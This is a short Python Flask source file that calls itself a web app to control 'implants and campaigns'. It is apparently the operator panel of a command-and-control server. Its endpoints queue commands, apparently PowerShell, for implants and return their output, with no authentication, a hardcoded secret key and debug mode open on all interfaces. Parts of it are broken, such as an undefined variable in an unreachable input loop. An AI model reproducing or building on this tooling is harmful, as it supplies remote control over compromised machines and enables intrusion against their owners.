from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response
import base64
from Implant import ImplantSingleton
# This is the web app to control implants and campaigns


Imp=ImplantSingleton.instance


app = Flask(__name__)
app.config.from_object(__name__)
app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'

@app.before_request
def before_request():
    return

@app.after_request
def add_header( r):
    return r

@app.route("/login", methods =['GET','POST'])
def login():
    return render_template('login.html')

@app.route("/", methods =['GET','POST'])
def management():
    return render_template('main.html')

@app.route("/aab", methods =['GET','POST'])
def cmdreturn():
    #print( Imp.Get_CommandResult())
    return str(Imp.Get_CommandResult())
#Endpoint query
@app.route("/aaa/<cmd>", methods =['GET','POST'])
@app.route("/aaa", methods =['GET','POST'])
def aaa(cmd=0):
    if request.method=="GET":
        Imp.AddCommand(cmd)
        return "a"
    else:
        Imp.AddCommand(request.form['ta'])
        return "OK."

# -- NEW ENDPOINTS -- #

@app.route("/home")
def BaseHomePage():
    return render_template("welcome.html")

@app.route("/<id>/")
def BaseImplantPage(id):
    return render_template("ImplantMain.html")

@app.route ("/<id>/settings")
def BaseImplantSettings(id):
    return "2"




if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5001, threaded=True)
    print ("App running")
    while True:
        a = raw_input("Enter PS command: ")
        I.AddCommand(a)